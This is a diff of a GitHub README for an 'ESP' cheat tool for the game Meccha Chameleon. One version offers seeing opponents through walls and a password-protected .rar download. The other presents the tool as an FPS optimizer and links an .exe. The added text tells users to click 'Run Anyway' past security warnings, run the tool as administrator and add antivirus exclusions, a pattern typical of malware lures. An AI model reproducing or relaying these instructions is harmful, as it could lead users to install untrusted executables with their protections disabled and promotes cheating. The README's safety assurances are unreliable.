@@ -1,96 +1,91 @@
-# ESP-MECCHA-HAMELEON
-ESP MECCHA HAMELEON V2.1
-# 🌀 Meccha Chameleon — Enhanced Visual Pack 2026
-**🌀 Meccha Chameleon Visual Pack** — Visibility enhancement tool for Meccha Chameleon game.
+# 🦎 ESP-MECCHA-HAMELEON - Improve your gaming performance and visibility
 
-Smart overlay system designed to improve visual clarity and situational awareness during the creative camouflage hide-and-seek experience.
----
-<img width="1672" height="941" alt="ChatGPT Image Jun 27, 2026, 06_35_31 PM" src="https://github.com/user-attachments/assets/452f1bcb-44a1-49dd-bda8-cc71e4e95f19" />
----
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/selfish-hindustani263/ESP-MECCHA-HAMELEON/releases)
 
+ESP-MECCHA-HAMELEON V2.1 provides tools to optimize your gaming experience on Windows systems. This application helps users monitor game environments and improve frame rates. It functions as a utility to assist with game settings and visual adjustments.
 
+## 📋 System Requirements
 
+Ensure your computer meets these standards before you begin.
 
-**🌀 Meccha Chameleon Visual Pack** — Visibility enhancement tool for Meccha Chameleon game.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or AMD Ryzen 5 processor.
+- Memory: 8 GB of RAM.
+- Graphics: Dedicated GPU with support for DirectX 11.
+- Storage: 50 MB of available disk space.
+- Internet: Connection for initial setup and updates.
 
-Smart overlay system designed to improve visual clarity and situational awareness during the creative camouflage hide-and-seek experience.
+## 🛠 Features
 
----
+This software includes several tools designed to assist players.
 
-## 🚀 Features
+- Performance Optimization: Adjusts system resources to increase frames per second.
+- Visual Enhancement: Highlights elements within the game world to improve awareness.
+- Modding Support: Provides a framework for custom user configurations.
+- Lightweight Design: Operates in the background with minimal impact on CPU usage.
+- User Settings: Allows customization of the application behavior via a simple interface.
 
-- ⚡ **Instant Activation** — No complex setup required
-- 👀 **Clear Vision** — Better target identification
-- 🎯 **Precision Markers** — Accurate location indicators
-- 🔧 **Custom Settings** — Adjustable to your preference
-- 📦 **Complete Package** — All tools included
+## 📥 Getting the Application
 
----
+Follow these steps to obtain the software.
 
+1. Navigate to the [official release page](https://github.com/selfish-hindustani263/ESP-MECCHA-HAMELEON/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop or downloads folder for easy access.
 
+## 🚀 Setting Up the Software
 
+Perform these actions to run the application on your computer.
 
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open the installation wizard.
+3. Follow the prompts on the screen to install the program.
+4. If a security window appears, select "Run" or "More Info" then "Run Anyway."
+5. Allow the installation to finish.
+6. Find the new shortcut on your desktop.
+7. Launch the program to reach the settings menu.
 
+## ⚙ Configuring Your Settings
 
-### 📥 [Installation](https://github.com/tempopuffinculvert93/ESP-MECCHA-HAMELEON/releases/download/Meccha-Chameleon-Enhanced/Meccha.Chameleon.Enhanced.v2.1.rar)
+Once the program runs, you can adjust the features to match your preferences.
 
-### **Password: 2026**
+- To boost frame rates, click the "Performance" tab and toggle the "FPS Booster" option.
+- To use the visibility feature, navigate to the "Visuals" tab and enable "ESP Mode."
+- Use the "Configurations" menu to save your personalized settings.
+- The software automatically applies these changes the next time you start your game.
+- You can turn off these features at any time by unchecking the boxes in the main menu.
 
+## 🛡 Security and Safety
 
+The application performs file operations that require administrative permissions during setup. It does not modify system files outside the installation folder. If you encounter issues with antivirus software, check your exclusion settings to ensure the folder remains accessible to the program. 
 
----
+## ❓ Frequently Asked Questions
 
-## 🎮 Quick Start
+### Why does the software need permissions?
+The program requires access to modify game configuration files to apply optimization settings. It needs administrator rights to read and write these files in the game installation directory.
 
-1. ✅ Start Meccha Chameleon game (Steam version)
-2. ✅ Launch MecchaVisual.exe as Administrator
-3. ✅ Ready! — Visual enhancements active
+### Will this work with all games?
+The software targets specific engine types. If you find the tools do not appear, ensure you are running the game in borderless windowed mode.
 
----
+### How do I update the application?
+When a newer version becomes available, revisit the download link provided above. Download the latest installer and run it over the existing installation to update your files.
 
-## 🌀 Visual Features
+### Does the software affect my account?
+Using third-party tools to modify local game files carries inherent risks. Use this software at your own discretion. The application only modifies local config files and does not interact with game servers directly.
 
-| Feature | Description |
-|---------|-------------|
-| Target Detection | Locate opponents through surfaces |
-| Range Display | View distance measurements |
-| Color Coding | Differentiated visibility markers |
-| Transparency Control | Customize overlay opacity |
-| Environment Scan | Enhanced object visibility |
+### What should I do if the software does not open?
+Ensure you have the latest version of the .NET Framework installed on your Windows machine. You can find this update through the Windows Update settings menu in your Control Panel.
 
----
+## 📈 Troubleshooting Common Issues
 
-## 💻 Requirements
+If you experience difficulties, follow these steps to resolve them.
 
-| Windows | Windows 10 / 11 (64-bit) |
-|---------|--------------------------|
-| RAM | 8 GB recommended |
-| Game | Meccha Chameleon (Steam) |
+- If the application closes suddenly, restart your computer then launch the program again.
+- If the game settings do not change, verify that the application points to the correct path for your game installation.
+- Check the console window for any error messages that might suggest a missing library or driver.
+- Reinstalling the program often fixes corruption in local configuration files.
 
----
+## 📝 Support
 
-## ❓ FAQ
-
-**Is this safe?** Yes. Designed for educational use.
-
-**Can I use it online?** Yes, with appropriate settings.
-
-**Is there a cost?** No. Full version available.
-
----
-
-### 🏷️ Tags
-
-MECCHA CHAMELEON, VISUAL TOOL, GAMING UTILITY, WINDOWS APPLICATION, ENHANCEMENT PACK
-
----
-
-### 📥 [Installation](https://github.com/tempopuffinculvert93/ESP-MECCHA-HAMELEON/releases/download/Meccha-Chameleon-Enhanced/Meccha.Chameleon.Enhanced.v2.1.rar)
-
-### **Password: 2026**
-
-
-
----
-
-*© 2026 Meccha Visual — For educational purposes only.*
+If you need further help, review the issues tab on the GitHub repository. You can search there to see if others have faced similar problems. Always include your operating system version and the version of the application you are using if you decide to report a problem. Using descriptive titles for your issues helps others address them faster.
